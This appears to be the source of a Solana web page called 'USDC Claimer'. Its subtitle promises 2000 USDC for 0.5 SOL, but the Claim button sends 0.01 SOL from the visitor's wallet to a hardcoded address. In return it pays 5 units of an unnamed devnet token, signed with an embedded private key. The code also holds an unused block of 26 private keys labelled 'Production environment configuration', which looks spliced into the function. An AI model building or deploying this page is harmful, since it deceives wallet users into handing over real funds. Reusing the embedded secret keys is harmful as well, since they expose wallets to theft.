/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "35xt5AqAJp3DosXLMX7fawW2KKqB9NXbeWFj88bvTqM6acE46v9MDNqv9WVGzjVvfDRDwvkC7t9xkQ2R3taCL9ba"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4HmSLhHTwtg52TM2StcvUWFQFwmNvS1UqPBucTrmvSu7rym2fYYo6BUPyDSSpPf5TCwz6Nty3PSTGhyCLYrEAU55",
  "key1": "5nqehBm2ftK6NV3nabjQp7hKRu48hYFXLBeBV1Dh9CvJqpc7Mo6cuZLCzAHm5dHQuVzjvooYDYkcPGrzRfupc5Qx",
  "key2": "4e2GKcBuhGhfMjoxuA2jKeEB6Dtf42SEyFLDsYTVoPkfDJuDiB75Fm4STsHd8Ki8hQK1bgrmZvE6gDSXzcd6WexS",
  "key3": "21cMckdjSfJ1HfXzVxXy2eAStdkg5DSivp8VbZJUhR32w5GcARwfNyCVFNEjGbqwcgJgqK8eF2maZVJho3muu3uR",
  "key4": "D3T4rJE82p6i4Ub2CJ4GFsL2L5ULWBUN9K5NmAMFzA6sLRDGXxJvSTkvBunB8TpDBozGGD6LDCL3vQsUJSS6zwx",
  "key5": "4uvs8pjU6wY8bekU6dpQUnPd8EL2MCYq1KnXzMB7TiatuTpM49QJsSEoF71AEkG8pBeH2rFV6vEz9cfYMQqJzduo",
  "key6": "gfZqdusJDjuFYfzXJo8i9Pd3BHTgZNnH362zsFExnz8jZYdxWoASEcRbvkBoKNyS6Ydjy4Dn5hc9yUiM9FSXJ8y",
  "key7": "4acCR4KiTuGEw5wurKLKDFBwfh1etRUXHmX85R46EXn95xFxHEAEfVrfMg15to72CaUR2J9Q2dbGQMViKJ16h44t",
  "key8": "vAX7ztND89Gc8ZrQHrGKeZaFxawPpDr4cAGG4KWxB1LKWQU7FyV3JkpnwpEdd7Km1gG5iywpLJf9Wxy9Kaf3813",
  "key9": "6WVFTDtRWhAmLcGvHFT3SAAnkrUe7TvgkRF45b6TrRa7W9Sf1DiwCFERGQygieBrqFS5PQhKnoCxZnXvPQexiwn",
  "key10": "soP5bKZpJVdu3WbwaDsZad7Hew7bApUYQVjdSmRZBK4ivcevEZvh41yuzdh8YSFnz7qTfnkQzY88MSRQEhjua2d",
  "key11": "4hjz8Kr5frKNBDPYKoCGsHmwWRjx1xMx362QqVHoKvnQVc9E2UQurezzUrHSQMvFHZWwnC6KBYR944ANUrbv1xhN",
  "key12": "42TBdJzmUjqZjACpJfbVceTruh5Tm5UnQJKRxYkjaoYNFU9YD5n7eavEu71pmHDTLwKk1p9F3iYeENpfgbEMkrdr",
  "key13": "4nCZ8R5pZV93e9csvGEmzrSGXQ5sczKfmsYyjNzoD7mVYwLxoeu94WhsWahgk29ms335aDTpvYtLn8LP5RrugtCn",
  "key14": "461c1aYrFWx5QUTXDxZgxYfq1f4ETsQz455CF7qhhz9gyEjaykVYYN89Q3jjhcsaNipjWzi4spqKse2sdueDFLYv",
  "key15": "5z25oYA7d1aofiPocYZ9iUMY9WV8C3CqFTAP22AAnxox2GjwJYZz2arERQPJwrzzdDtwovq1bGSwZVHhWbJ1x9K5",
  "key16": "3eo8zXTYKFGkq43dzBTYQZLnaRnuSwDtQDmAKo73Bbr97BL6yHjAWrxQzhijjpYwzoJXHn4sLy1gPWxYRHAZAaVJ",
  "key17": "3n4142rPCzndzbEEeCvEjXpF5M3DeWNywsSQtWniEVjJc5C4Hr9kUf1Xv5Uo9Q8ESDLGobTvVhAYbNyCE1oqLA1N",
  "key18": "2JiZ4zzemDyCtnHmw5qgHxu26BRLWybhdVp3Qtg3NEsPdFcb6ZNMeshKghZbToqqw4Keij8KjKX28Qhbh52waUPx",
  "key19": "a24rjUKgoBoRyt3AvH8SZCNZJVEUaoj3B6E5MEsQFymXHN7sVkNs8BVGT1MvXZb4cCrryqVkPehKwmRqdE4nrSn",
  "key20": "r9bjamWwqmkrD53teN86iUN4Lb377wdb76GaBYUUyKfRjQgGfXf3MoHMJmfoTY4WePeHvEcXAA6iCjTFgoRaM8x",
  "key21": "387A8pV8ryVP7ipM5MwxzvBWtUJuxG43XFfbKiVvH9w4C4Kn81J68Lw1vJQPWmmn5eHRVTXUYHzNR66zx9DgW4Kp",
  "key22": "65hZNqMwNeKkTCbMLZJ34VUJjEA8MREBzxJcAetbv1767AiVVqynwF6nd1G9bxFXzn29ecvWas4xGgcXhtKYdEWP",
  "key23": "5NcT7Haxif56dj88ZUZnvK3twYyWHQ2mBjgVutdMi2oMXpDqDdqvEfnVY71QvPbZECQ3n7w2b7SaVRzNtKXGYJXE",
  "key24": "2VYbx6grXwNwg5pQzWdHfZt5aw2xXeAxN5Qr2r28S5EQXDdxPeAjLA8qn2XaguzUBYrwHmWVCn1zfHhiwDvrFMeC",
  "key25": "2MVuc8jbrpKNr178UF5fzbND7KBVxmJrnaPDtr8cm5YATPJQ6FB1DQrnM7h9cpPi2GLnhRQaVLLPA4b7WvGv6GRm"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
